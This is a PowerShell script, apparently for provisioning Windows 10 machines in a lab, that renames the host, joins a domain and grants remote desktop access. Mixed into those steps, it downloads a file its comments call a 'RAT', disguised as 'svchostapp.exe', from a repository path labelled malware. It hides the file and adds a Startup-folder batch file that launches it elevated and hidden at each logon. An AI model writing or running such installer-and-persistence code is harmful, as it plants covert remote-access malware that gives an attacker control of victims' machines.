### Basic non-Parameterized ps1 script to allow introduction of various limited-provisioning commands to Windows 10
param(
  [String]$defAdminUsr, 
  [String]$defAdminPwd,
  [String]$domain,
  [String]$domAdminUsr,
  [String]$domAdminPwd,
  [String]$localpath,
  [String]$downloadlink,
  [String]$hostname
)

### Still missing in current build
#   Condition the following functions: Domain add, Computer rename, PSCredential creation, RAT addons, Evaluation rearm
#
###

# Static URLs to download RAT and static download locat
$raturl = "https://github.com/cybermias/publicrep/raw/master/malware/dangerzone/svchostapp.exe"
$startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"


# Define PSCredential variables following input from arguments (Domain and Local)
$temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
$localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd

$temppwd = ConvertTo-SecureString -String $domAdminPwd -AsPlainText -Force
$domaincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($domain + "\" + $domAdminUsr),$temppwd


# Rename the computer according to the Arguments
rename-computer -newname $hostname -force


# Add the computer to a domain (if available)
add-computer -domainname $domain -domaincredential $domaincred
Add-LocalGroupMember -group "Remote Desktop Users" -member $domAdminUsr


# Download RAT to argument specified location and hide the file with attributes
Invoke-WebRequest -uri $raturl -OutFile $localpath

$hideFile = get-item $localpath -Force
$hideFile.attributes = "Hidden"


# Add a startup script (BAT) to make sure RAT is run by the logging user
add-content $startup "@echo off"
add-content $startup "powershell -c start -verb runas $localpath -windowstyle hidden" 


# Shift pagefile to the temporary drive (just in case)
new-itemproperty -path "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -name PagingFiles -propertytype MultiString -value "D:\pagefile.sys" -force


cscript c:\windows\system32\slmgr.vbs /rearm
shutdown /r /t 03
